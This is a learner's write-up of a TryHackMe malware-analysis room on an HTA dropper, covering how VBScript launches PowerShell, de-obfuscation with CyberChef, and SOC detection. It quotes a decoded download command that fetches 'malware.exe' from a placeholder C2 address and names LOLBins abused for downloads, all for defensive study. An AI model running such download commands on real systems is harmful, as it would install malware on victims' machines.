# Day 21: Malware Analysis - Malhare.exe

## üìã Quick Facts
- **Date Completed:** December 21, 2025
- **Time Spent:** 2 hours
- **Difficulty:** ‚òÖ‚òÖ‚òÖ‚òÖ (Hard)
- **Category:** Malware Analysis / HTA / PowerShell / Reverse Engineering
- **Room URL:** https://tryhackme.com/room/htapowershell-aoc2025-p2l5k8j1h4

---

## üéØ Challenge Overview

This challenge focused on analyzing a sophisticated malware dropper disguised as a harmless gift file (`santas_gift.hta`). The file was an **HTA (HTML Application)** used by the "Malhare" campaign to bypass standard email filters. Unlike a regular web page, this file leveraged the Windows `mshta.exe` utility to execute malicious VBScript and PowerShell commands with full system privileges. I performed static analysis to de-obfuscate the code, identify the hidden payload, and extract the Command & Control (C2) server URL without executing the malware.

**Learning Objectives:**
- Understand the difference between standard HTML and HTA (HTML Applications)
- Analyze how attackers use "Living off the Land" binaries (LOLBins) like `mshta.exe`
- Identify embedded VBScript and JavaScript within HTML structures
- De-obfuscate strings and variables to reveal hidden PowerShell payloads
- Extract Indicators of Compromise (IOCs) such as C2 domains

---

## üí° What I Learned

### HTML vs. HTA (The Wolf in Sheep's Clothing)

**This was the core concept of the day:**

| Feature | Standard HTML (`.html`) | HTML Application (`.hta`) |
| :--- | :--- | :--- |
| **Engine** | Browser (Chrome, Edge, Firefox) | `mshta.exe` (Windows System) |
| **Security** | **Sandboxed** (Limited access) | **Full Trust** (User privileges) |
| **Capabilities** | Display content, basic scripts | Read/Write files, Edit Registry, Run CMD/PowerShell |
| **Danger** | Low (mostly phishing sites) | **Critical** (can install ransomware) |

**Key Insight:** Attackers use `.hta` extensions because they look like innocuous web pages to users, but Windows treats them as executable programs.

### The Attack Chain (How it Works)

The malware relied on a multi-stage execution flow:

1.  **The Container (HTML):** The user opens the file. It displays a fake "Gift" interface to distract them.
2.  **The Logic (VBScript):** Hidden inside `<script>` tags, VBScript code runs automatically. It constructs a malicious command string using obfuscation (reversing strings, replacing characters) to hide its intent from antivirus.
3.  **The Execution (PowerShell):** The VBScript passes the de-obfuscated string to `WScript.Shell`, launching PowerShell.
4.  **The Payload:** PowerShell connects to a remote server (C2) to download the actual malware (e.g., ransomware or a RAT).

### Static Analysis & De-obfuscation

Since running this file would infect the machine, I used **Static Analysis** (reading the code):

**1. Spotting the Script:**
I opened the file in a text editor and ignored the HTML `<body>` tags. The dangerous part was inside `<script language="VBScript">`.

**2. Variable Analysis (The Hard Part):**
The script used random variable names (like `var_1`, `a`, `b`) to confuse analysts.
* *Obfuscation technique:* The script didn't say `http://malicious.com`. Instead, it built the URL character by character using ASCII codes (e.g., `Chr(104)` for 'h').

**3. Decoding the Payload:**
I identified the final variable being passed to the `Run` function. By manually tracing how that variable was built (or using CyberChef to reverse the string operations), I revealed the hidden PowerShell command:
`powershell -e <Base64String>`

**4. Base64 Decoding:**
Using CyberChef, I decoded the Base64 string to see the actual command:
`Invoke-WebRequest -Uri http://<C2_SERVER_IP> -OutFile malware.exe`

---

## üõ†Ô∏è Tools & Techniques Used

### Tools
1.  **Text Editor (Pluma/Notepad++)** - For safely viewing the source code of the `.hta` file.
2.  **CyberChef** - Used to decode Base64 strings and reverse text obfuscation.
3.  **Mshta.exe** - The native Windows binary used (conceptually) to execute the file.

### Techniques
- **Static Code Analysis** - Examining source code without execution to identify logic.
- **De-obfuscation** - Reversing string manipulation (Reverse, Replace, CharCode) to make text readable.
- **IOC Extraction** - Identifying the C2 URL and file names used by the attacker.
- **Source Code Review** - Distinguishing between benign HTML/CSS and malicious VBScript.

---

## ü§î Challenges I Faced

**Familiarity vs. Complexity:**
I have some background with HTML from my ILS (Information and Library Science) studies, so the *structure* of the file (tags, body, head) was familiar. However, the **VBScript logic** inside was completely new and very difficult.

**The "Logic Gap":**
The hardest part was following the variable manipulation. The script would define a variable, reverse it, append a character, and then replace a letter. Tracing this flow mentally was exhausting. It wasn't just reading code; it was solving a math problem where the numbers were text strings.

**Retention Struggle:**
To be honest, **I don't remember much of the specific syntax now.** The room was rated ‚òÖ‚òÖ‚òÖ‚òÖ (Hard) for a reason. While I managed to complete the steps at the time, the specific VBScript functions and PowerShell flags haven't stuck in my memory. It felt like "following instructions to survive" rather than "mastering the language."

---

## ‚úÖ How This Helps My Career

Analyzing "Living off the Land" (LotL) attacks is a daily task for **SOC Analysts**:

**Phishing Triage:**
HTA files are a classic phishing attachment. As a Tier 1 Analyst, if a user reports a suspicious email with an `.hta` attachment, I need to know **not to double-click it** and how to open it in a text editor to check for malicious scripts.

**Behavioral Detection:**
Understanding that `mshta.exe` should usually not be making network connections helps me understand SIEM alerts. If I see `mshta.exe` spawning `powershell.exe` in the logs (Process Tree), I now know that is a **high-fidelity indicator of an HTA attack**.

**Interview Talking Point:**
"I have analyzed HTA malware samples by examining the source code statically to identify 'Living off the Land' attacks. I understand how attackers embed VBScript inside HTML to launch PowerShell commands. While I am not a developer, I can identify the malicious components of a script file and use tools like CyberChef to extract the underlying payload or C2 addresses without executing the file, which allows for safer and faster incident triage."

---

## üîó Security+ Connection

**Domain 2.0 - Threats, Vulnerabilities & Mitigations:**
* **Social Engineering:** Phishing vectors and malicious attachments.
* **Malware Types:** Fileless malware, scripts, droppers, and Downloader Trojans.

**Domain 4.0 - Security Operations:**
* **Malware Analysis:** Techniques for safely analyzing suspicious files (Static vs. Dynamic).
* **Secure Coding:** Input validation and script security.

---

## üì∏ Evidence

![HTA Source Code View](../07-Screenshots/day-21/hta-source-code.png)
*Viewed the .hta file in a text editor, identifying the mix of HTML tags and malicious VBScript blocks*

![CyberChef Deobfuscation](../07-Screenshots/day-21/cyberchef-payload.png)
*Extracted the obfuscated string from the script and used CyberChef to reveal the hidden PowerShell command*

---

## üìö Key Takeaways for Future Reference

**HTA/Script Analysis Checklist:**

‚úÖ **Safety First:**
* **NEVER** double-click an `.hta`, `.js`, or `.vbs` file to check it.
* **ALWAYS** Right-click ‚Üí "Edit" or "Open with Notepad".

‚úÖ **Red Flags in Source Code:**
* `<script language="VBScript">` or `JScript`.
* Unreadable variable names (e.g., `var_x23`, `a`, `b`).
* Suspicious functions: `Run`, `Exec`, `Eval`, `Execute`, `CreateObject("WScript.Shell")`.
* ASCII character codes: `Chr(104) & Chr(116)...` (spells "http").
* Base64 strings: Long random alphanumeric strings ending in `=`.

‚úÖ **De-obfuscation Logic Flow (Cheat Sheet):**
*If I see variable manipulation like `var_a = StrReverse(var_b)`, I should:*
1.  **Copy** the string inside `var_b`.
2.  **Paste** it into CyberChef.
3.  **Apply** the "Reverse" recipe.
4.  **Repeat** for other functions (Replace, From Base64, etc.) until text is readable.

‚úÖ **Common "Living off the Land" Binaries (LOLBins):**
* **mshta.exe** - Executes HTA files.
* **powershell.exe** - Executes scripts (look for `-enc` or `-EncodedCommand`).
* **wscript.exe / cscript.exe** - Executes `.vbs` and `.js` files.
* **certutil.exe** - Often abused to download files.

**Investigation Query (Splunk Concept):**
```spl
index=windows_sysmon ParentImage="*mshta.exe" Image="*powershell.exe"
